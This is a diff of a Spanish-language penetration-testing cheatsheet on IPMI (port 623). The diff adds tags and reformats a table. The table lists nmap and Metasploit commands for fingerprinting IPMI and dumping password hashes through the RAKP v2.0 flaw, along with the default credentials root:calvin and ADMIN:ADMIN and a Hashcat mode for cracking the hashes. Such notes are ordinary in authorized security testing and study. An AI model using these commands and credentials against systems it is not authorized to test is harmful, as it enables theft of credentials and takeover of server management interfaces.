@@ -2,6 +2,15 @@
 aliases:
 tags:
   - type/cheatsheet
+  - service/ipmi
+  - protocol/ipmi
+  - port/623
+  - tool/nmap
+  - tool/msfconsole
+  - meta/default-creds
+  - meta/firmware
+  - meta/management-ports
+  - technique/credential-access
 primary categories:
   - "[[Penetration Test]]"
 secondary categories:
@@ -18,12 +27,12 @@ linked:
 
 ## Cheatsheet
 
-|**Acción**|**Descripción**|
-|---|---|
-|`sudo nmap -sU --script ipmi-version -p 623 <target>`|Realiza un escaneo de versión IPMI con Nmap.|
-|`msfconsole -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS <target>; run;"`|Escanea la versión de IPMI usando Metasploit.|
-|`msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <target>; run;"`|Extrae hashes de contraseñas explotando un fallo en RAKP v2.0.|
-|`root:calvin``ADMIN:ADMIN`|Probá las siguientes credenciales por defecto.|
+| **Acción**                                                                              | **Descripción**                                                |
+| --------------------------------------------------------------------------------------- | -------------------------------------------------------------- |
+| `sudo nmap -sU --script ipmi-version -p 623 <target>`                                   | Realiza un escaneo de versión IPMI con Nmap.                   |
+| `msfconsole -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS <target>; run;"`    | Escanea la versión de IPMI usando Metasploit.                  |
+| `msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <target>; run;"` | Extrae hashes de contraseñas explotando un fallo en RAKP v2.0. |
+| `root:calvin``ADMIN:ADMIN`                                                              | Probar las siguientes credenciales por defecto.                |
 **Nota:** Usar el modo **Hashcat 7300** para crackear hashes RAKP. #porhacer:enlazar a hashcat.
 
 ***
